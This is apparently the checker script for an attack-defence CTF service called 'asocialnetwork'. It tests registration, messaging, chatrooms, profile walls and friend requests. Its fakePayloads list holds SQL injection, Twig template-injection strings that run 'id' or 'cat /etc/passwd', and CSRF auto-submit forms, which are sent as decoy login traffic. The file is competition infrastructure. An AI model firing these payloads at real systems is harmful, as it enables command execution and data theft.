import json
import random
import secrets
from typing import Optional
from httpx import AsyncClient
from logging import LoggerAdapter
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    HavocCheckerTaskMessage
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
import time
from playwright.async_api import async_playwright
from http.server import BaseHTTPRequestHandler, HTTPServer
import multiprocessing
import hashlib
import os
from faker import Faker
from html import unescape
from urllib import parse
import re

name_fake = Faker(
    locale=['ja-JP', 'en-US', 'de-DE', 'fr-FR', 'it-IT', 'es-ES', 'ru-RU', 'zh-CN', 'pt-BR', 'pl-PL', 'tr-TR', 'id-ID',
            'ar-EG', 'ko-KR', 'th-TH', 'cs-CZ', 'bg-BG', 'el-GR', 'fa-IR', 'fi-FI', 'he-IL', 'hi-IN', 'hu-HU', 'nl-NL',
            'no-NO', 'ro-RO', 'sv-SE', 'uk-UA', 'vi-VN', 'sk-SK', 'sl-SI', 'lt-LT', 'hr-HR'])
HOST = "0.0.0.0"
PORT = 6452

SERVICE_PORT = 3000
checker = Enochecker("asocialnetwork", SERVICE_PORT)
app = lambda: checker.app
getUrl = lambda task: f"http://{task.address + ':' + str(SERVICE_PORT)}"


def encode(message, recipient, logger):
    message = message.encode('utf-8').hex()
    recipient = recipient * (len(message) // len(recipient) + 1)
    encoded_message = "".join([chr(ord(message[i]) ^ ord(recipient[i])) for i in range(len(message))])
    encoded_message = encoded_message
    return encoded_message


async def register(task, client, password, logger):
    r = None
    username = None
    for _ in range(10):
        username = name_fake.name().lower().replace(' ', '_') + str(random.randint(0, 100000))
        logger.debug(f"Registering as {username}:{password}")
        r = await client.post(f"{getUrl(task)}/register",
                              json={"username": username, "password": password, "confirmPassword": password})
        if r.status_code == 302:
            break
    assert_equals(r.status_code, 302, "registering failed")
    return r.cookies, username


def generateNoise():
    return name_fake.text()


async def login(task, client, username, password, logger):
    logger.debug(f"Logging in as {username}:{password}")
    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
    assert_equals(r.status_code, 302, "login failed")
    return r.cookies


async def sendMessage(task, client, recipient, message, logger):
    if not (password := os.environ.get('ENOCHECKER_PUTFLAG_PASSWORD')):
        password = secrets.token_hex(32)
    encoded_message = encode(message, recipient, logger)
    cookie, username = await register(task, client, password, logger)
    await client.post(f"{getUrl(task)}/messages/", json={"recipient": recipient, "message": encoded_message},
                      cookies=cookie)
    return username, password, cookie


async def retrieveMessage(task, client, recipient, logger, username, password):
    cookie = await login(task, client, username, password, logger)
    logger.debug(f"Retrieving Message for {username}:{password}")
    r = await client.get(f"{getUrl(task)}/messages/{recipient}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving message failed")
    return r, cookie


async def createChatroom(task, name, public, client, cookie, logger):
    logger.debug(f"Creating private chatroom {name}")
    r = await client.post(f"{getUrl(task)}/chatroom", json={'roomname': name, 'public': 'true' if public else 'false'},
                          cookies=cookie)
    assert_equals(r.status_code, 200, "creating private chatroom failed")
    return r.text


@checker.putflag(0)
async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> \
        Optional[str]:
    flag = task.flag
    cookie, recipient = await register(task, client, secrets.token_hex(32), logger)
    username, password, cookie = await sendMessage(task, client, recipient, flag, logger)
    await chain_db.set("userdata", (username, recipient, password))
    if os.environ.get('ENOCHECKER_PUTFLAG_PASSWORD', None):
        return json.dumps({'username': username, 'recipient': recipient})
    return json.dumps({'username': username})


browsers = dict()
localIpAddressRegex = "(^127\\.)|(^10\\.)|(^172\.1[6-9]\\.)|(^172\.2[0-9]\\.)|(^172\.3[0-1]\\.)|(^192\.168\\.)"
gLogger = None

async def requestHandler(route):
    if os.environ.get('ENOCHECKER_PUTFLAG_PASSWORD', None):
        await route.continue_()
        return
    if route.request.resource_type in ['stylesheet', 'font', 'image', 'media', 'script']:
        await route.abort()
    else:
        await route.continue_()


async def retrieve(task, logger, username, password, recipient, start, client, exploit=False):
    if not browsers.get(os.getpid()) or not browsers[os.getpid()].get("browser"):
        browsers[os.getpid()] = {"playwright": await async_playwright().start()}
        browsers[os.getpid()]["browser"] = await browsers[os.getpid()]["playwright"].chromium.launch(headless=True)
    try:
        browser = browsers[os.getpid()]["browser"]
    except Exception as e:
        logger.debug(browsers)
        raise e
    try:
        context = await browsers[os.getpid()]["browser"].new_context()
        page = await context.new_page()
        await page.route("**/*", requestHandler)
    except Exception as e:
        try:
            await browser.close()
        except:
            pass
        try:
            p = browsers[os.getpid()]["playwright"]
            await p.stop()
        except:
            pass
        browsers.pop(os.getpid(), None)
        raise e
    try:
        cookies = (await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})).cookies
        if not cookies['session']:
            raise MumbleException("login failed")
        cookie = [{'name': 'session', 'value': cookies['session'], 'domain': task.address, 'path': '/'}]
        await context.add_cookies(cookie)
        await page.goto(f"{getUrl(task)}/messages/{recipient}")
        content = await page.content()
        if not exploit:
            assert_in(task.flag, content, "flag missing")
        while len(content.split('<div class="modal-body" style="white-space: pre-line">')) > 1 \
                and time.time() - start < ((task.timeout / 1000) - 2):
            logger.debug(content.split('<div class="modal-body" style="white-space: pre-line">')[1].split('</div>')[0])
            await page.goto(f"{getUrl(task)}/messages/{recipient}")
            content = await page.content()
    except Exception as e:
        logger.error(f"Error: {repr(e)}")
        raise e
    finally:
        await context.close()


@checker.getflag(0)
async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    start = time.time()
    try:
        username, recipient, password = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    global gLogger
    gLogger = logger
    await retrieve(task, logger, username, password, recipient, start, client)


@checker.putflag(1)
async def putflag1(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> \
        Optional[str]:
    flag = task.flag
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    roomName = secrets.token_hex(10)
    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": flag}, cookies=cookie)
    await chain_db.set("userdata", (username, password, roomUrl))
    return json.dumps({'username': username})


@checker.getflag(1)
async def getflag1(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, roomUrl = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(task.flag, r.text, "flag missing")
    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
    logger.debug("Getting chatroom with new user")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
    try:
        assert_in(task.flag, r.text, "chatroom preventing access to new user")
    except Exception as e:
        logger.debug("Error finding " + task.flag + " in " + r.text)
        raise e


@checker.putnoise(0)
async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = generateNoise()
    cookie, recipient = await register(task, client, secrets.token_hex(32), logger)
    username, password, cookie = await sendMessage(task, client, recipient, noise, logger)
    await chain_db.set("noise", (username, recipient, password, noise))


@checker.getnoise(0)    
async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, recipient, password, noise = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    r, _ = await retrieveMessage(task, client, recipient, logger, username, password)
    try:
        assert_in(noise, unescape(r.text), "noise missing from messages")
    except Exception as e:
        logger.debug("Error finding " + noise + " in " + r.text)
        raise e


@checker.putnoise(1)
async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = generateNoise()
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    roomName = secrets.token_hex(10)
    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
    logger.debug(f"Created public chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving public chatroom failed")
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": noise}, cookies=cookie)
    assert_equals(r.status_code, 302, "sending public chatroom message failed")
    await chain_db.set("noise", (username, password, noise, roomUrl))


@checker.getnoise(1)
async def getnoise1(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise, roomUrl = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    try:
        assert_in(noise, unescape(r.text), "noise missing from public chatroom")
    except Exception as e:
        logger.debug("Error finding " + noise + " in " + r.text)
        raise e
    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
    assert_in(noise, unescape(r.text), "public chatroom preventing access to new user")


@checker.putnoise(2)
async def putnoise2(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = generateNoise()
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    roomName = secrets.token_hex(10)
    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving private chatroom failed")
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages",
                          json={"message": noise}, cookies=cookie)
    assert_equals(r.status_code, 302, "sending private chatroom message failed")
    await chain_db.set("noise", (username, password, noise, roomUrl))


@checker.getnoise(2)
async def getnoise2(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise, roomUrl = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    try:
        assert_in(noise, unescape(r.text), "noise missing from private chatroom")
    except Exception as e:
        logger.debug("Error finding " + noise + " in " + r.text)
        raise e
    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
    assert_in(noise, unescape(r.text), "private chatroom preventing access to new user")


@checker.putnoise(3)
async def putnoise3(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    profilePic = random.choice(range(1, 50))
    r = await client.post(f"{getUrl(task)}/profile-picture?pic={profilePic}", cookies=cookie)
    assert_equals(r.status_code, 200, "setting profile picture failed")
    await chain_db.set("noise", (username, password, profilePic))


@checker.getnoise(3)
async def getnoise3(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, profilePic = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}", cookies=cookie)
    assert_in(f"/assets/profile-pics/{profilePic}.jpg", r.text, "profile picture missing or incorrect at home")


@checker.putnoise(4)
async def putnoise4(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    noise = generateNoise()
    cookie, username = await register(task, client, password, logger)
    r = await client.post(f"{getUrl(task)}/profile/{username}/wall", json={'message': noise}, cookies=cookie)
    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
    await chain_db.set("noise", (username, password, noise))


@checker.getnoise(4)
async def getnoise4(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
    try:
        assert_in(noise, unescape(r.text), "message missing from profile wall")
    except Exception as e:
        logger.debug("Error finding " + noise + " in " + r.text)
        raise e


@checker.putnoise(5)
async def putnoise5(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    noise = generateNoise()
    cookie, username = await register(task, client, password, logger)
    partnerCookie, partner = await register(task, client, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
    assert_in(f"You are not friends with this user", r.text, "profile page visible to non-friends")
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookie)
    assert_equals(r.status_code, 200, "sending friend request failed")
    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
    assert_in(f"You are not friends with this user", r.text, "profile page visible to requested friends")
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': partner, 'status': 'accept'}, cookies=partnerCookie)
    assert_equals(r.status_code, 200, "accepting friend request failed")
    r = await client.post(f"{getUrl(task)}/profile/{partner}/wall", json={'message': noise}, cookies=partnerCookie)
    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
    await chain_db.set("noise", (username, partner, password, noise))


@checker.getnoise(5)
async def getnoise5(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, partner, password, noise = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
    try:
        assert_in(noise, unescape(r.text), "noise missing from profile wall")
    except Exception as e:
        logger.debug("Error finding " + noise + " in " + r.text)
        raise e


@checker.havoc(0)
async def havoc0(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    username = name_fake.name().lower().replace(' ', '_') + str(random.randint(100001, 1000000))
    password = secrets.token_hex(32)
    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
    assert_equals(r.status_code, 401, "login with invalid credentials succeeded")


@checker.havoc(1)
async def havoc1(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    r = await client.post(f"{getUrl(task)}/register",
                          json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 302, "register failed")
    r = await client.post(f"{getUrl(task)}/register",
                          json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 400, "register with duplicate credentials succeeded")


@checker.havoc(2)
async def havoc2(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
    assert_equals(r.status_code, 200, "getting profile failed")


@checker.havoc(3)
async def havoc3(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    encoded_message = encode(secrets.token_hex(32), secrets.token_hex(32), logger)
    cookie, username = await register(task, client, password, logger)
    r = await client.post(f"{getUrl(task)}/messages/",
                          json={"recipient": secrets.token_hex(32), "message": encoded_message},
                          cookies=cookie)
    assert_equals(r.status_code, 404, "sending message to invalid recipient succeeded")


@checker.havoc(4)
async def havoc4(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    cookie, _ = await register(task, client, password, logger)
    _, newUser = await register(task, client, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{newUser}", cookies=cookie)
    assert_equals(r.status_code, 400, "getting profile of non-friend succeeded")


fakePayloads = [
    "' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -",
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
    "{{[0]|reduce('system','id')}}",
    "{{['id']|map('system')|join}}",
    "{{['id']|filter('system')}}",
    "{{['id',1]|sort('system')|join}}",
    "{{['cat\x20/etc/passwd']|filter('system')}}",
    "{{['cat$IFS/etc/passwd']|filter('system')}}",
    "{{['id']|filter('passthru')}}",
    "{['id']|map('passthru')}}",
    """<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
     <input name="username" type="hidden" value="CSRFd" />
     <input type="submit" value="Submit Request" />
    </form>
    <script>
     document.getElementById("autosubmit").submit();
    </script>""",
    "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>"
]


@checker.havoc(5)
async def havoc5(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    await client.post(f"{getUrl(task)}/login",
                      json={"username": fakePayloads[secrets.randbelow(len(fakePayloads))], "password": password})

userAgents = [
    "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3",
    "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
    "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
    "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
    "Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
    "Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
    "Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
    "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
    "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
    "Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
    "Dalvik/2.1.0 (Linux; U; Android 9; ADT-2 Build/PTT5.181126.002)",
    "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36",
    "Roku4640X/DVP-7.70 (297.70E04154A)",
    "Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
    "Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
    "AppleTV11,1/11.1",
    "AppleTV6,2/11.1",
    "AppleTV5,3/9.1.1",
    "Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
